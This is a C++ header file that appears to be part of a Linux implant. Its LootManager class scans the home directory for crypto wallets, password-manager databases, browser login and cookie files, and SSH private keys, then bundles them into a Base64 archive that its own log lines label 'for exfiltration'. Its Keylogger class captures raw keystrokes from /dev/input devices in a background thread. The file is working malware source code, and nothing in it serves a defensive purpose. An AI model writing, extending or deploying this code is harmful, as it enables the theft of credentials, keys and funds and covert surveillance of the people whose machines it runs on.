#pragma once

#include "ExfilEnvelope.hpp"
#include "LootArchive.hpp"
#include "Util/SafeLogger.hpp"

#include <atomic>
#include <chrono>
#include <exception>
#include <fcntl.h>
#include <filesystem>
#include <fstream>
#include <linux/input.h>
#include <mutex>
#include <regex>
#include <string>
#include <thread>
#include <unistd.h>
#include <vector>

namespace fs = std::filesystem;

class LootManager {
public:
    struct TargetPattern {
        std::string name;
        std::regex pattern;
    };

    [[nodiscard]]
    static std::vector<fs::path> scan_for_loot() {
        std::vector<fs::path> found_files;
        std::vector<TargetPattern> targets = {
            {"Wallets",   std::regex(R"(.*wallet.*\.dat$|.*\.wallet$)", std::regex::icase)},
            {"Passwords", std::regex(R"(.*\.kdbx$|.*\.pwm$|.*\.lastpass$)", std::regex::icase)},
            {"Browser",   std::regex(R"(.*Login Data$|.*key[34]\.db$|.*cookies\.sqlite$)", std::regex::icase)},
            {"SSH Keys",  std::regex(R"(.*id_rsa$|.*id_ed25519$|.*\.pem$)", std::regex::icase)}
        };

        const char* home = std::getenv("HOME");
        std::string search_root = home ? home : "/home";

        try {
            for (const auto& entry : fs::recursive_directory_iterator(
                     search_root, fs::directory_options::skip_permission_denied)) {
                if (not entry.is_regular_file()) {
                    continue;
                }

                if (found_files.size() >= exfil::kMaxLootFiles) {
                    break;
                }

                std::string filename = entry.path().filename().string();
                for (const auto& target : targets) {
                    if (std::regex_match(filename, target.pattern)) {
                        found_files.push_back(entry.path());
                        break;
                    }
                }
            }
        } catch (const std::exception& e) {
            logger::debug("Scanning file directory exception: {}", e.what());
        }

        return found_files;
    }

    [[nodiscard]]
    static std::string execute_loot_command() {
        logger::info("Starting loot scan...");
        auto files = LootManager::scan_for_loot();

        if (files.empty()) {
            logger::debug("No sensitive files found.");
            return "";
        }

        logger::debug("Found {} files for exfiltration", files.size());

        std::vector<loot_archive::LootFileEntry> entries;
        std::size_t total_bytes = 0;

        for (const auto& path : files) {
            std::ifstream file(path, std::ios::binary | std::ios::ate);
            if (not file.is_open()) {
                continue;
            }

            const auto file_size = static_cast<std::size_t>(file.tellg());
            if (file_size > exfil::kMaxLootFileBytes) {
                continue;
            }
            if (total_bytes + file_size > exfil::kMaxLootTotalBytes) {
                break;
            }

            file.seekg(0);
            loot_archive::LootFileEntry entry;
            entry.path = path.string();
            entry.data.resize(file_size);
            if (!file.read(reinterpret_cast<char*>(entry.data.data()), static_cast<std::streamsize>(file_size))) {
                continue;
            }

            total_bytes += file_size;
            entries.push_back(std::move(entry));
            logger::debug("Added {} ({} bytes)", path.filename().string(), file_size);
        }

        if (entries.empty()) {
            return "";
        }

        logger::info("Encoding archive to Base64...");
        return loot_archive::encode_base64_archive(entries);
    }
};

class Keylogger {
private:
    std::atomic<bool> running{false};
    std::thread worker;
    std::vector<std::string> key_buffer;
    std::mutex buffer_mutex;
    std::string active_command_uid_;

    std::string keycode_to_str(int code) {
        static const char* map[] = {
            "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE",
            "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "ENTER", "L_CTRL",
            "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "R_SHIFT", "KPA*", "L_ALT", "SPACE"
        };
        if (code >= 0 && code < static_cast<int>(sizeof(map) / sizeof(map[0]))) {
            return map[code];
        }
        return "[UNKNOWN]";
    }

    void log_loop() {
        int fd = open("/dev/input/event4", O_RDONLY);
        if (fd == -1) {
            fd = open("/dev/input/event3", O_RDONLY);
        }

        if (fd == -1) {
            return;
        }

        struct input_event ev;
        while (running) {
            if (read(fd, &ev, sizeof(struct input_event)) > 0) {
                if (ev.type == EV_KEY && ev.value == 1) {
                    std::lock_guard<std::mutex> lock(buffer_mutex);
                    key_buffer.push_back(keycode_to_str(ev.code));
                }
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
        close(fd);
    }

public:
    void start(const std::string& command_uid) {
        if (running) {
            return;
        }
        active_command_uid_ = command_uid;
        running = true;
        worker = std::thread(&Keylogger::log_loop, this);
    }

    void stop() {
        running = false;
        if (worker.joinable()) {
            worker.join();
        }
        active_command_uid_.clear();
    }

    std::vector<std::string> collect_and_clear() {
        std::lock_guard<std::mutex> lock(buffer_mutex);
        std::vector<std::string> output = std::move(key_buffer);
        key_buffer.clear();
        return output;
    }

    bool is_running() const {
        return running;
    }

    [[nodiscard]] const std::string& active_command_uid() const {
        return active_command_uid_;
    }
};
